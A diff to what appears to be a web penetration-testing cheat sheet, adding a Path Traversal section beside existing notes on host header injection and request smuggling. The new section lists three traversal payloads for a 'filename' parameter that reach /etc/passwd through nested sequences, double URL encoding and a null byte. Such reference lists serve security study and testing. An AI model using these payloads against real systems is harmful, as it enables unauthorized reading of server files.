@@ -31,6 +31,11 @@
   - []()
   - []()
   
+- [Path Traversal](#Path_Traversal]
+  - [Nasted traversal squences](#Nasted)
+  - [Non-standard encodings](#Encoding)
+  - [Null Byte](#Nullbyte)
+  
 # Host_Header_Injection
 
 ## HHI_malicious_port
@@ -152,5 +157,18 @@ Transfer-Encoding
 To uncover a TE.TE vulnerability, it is necessary to find some variation of the Transfer-Encoding header such that only one of the front-end or back-end servers processes it, while the other server ignores it.
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## Nasted
+```
+filename=....//....//....//etc//passwd
+```
+## Encoding
+```
+filename=..%252f..%252f..%252fetc%252fpasswd
+```
+## Nullbyte
+```
+filename=../../../etc/passwd%00.png 
+```
 References
 - https://portswigger.net
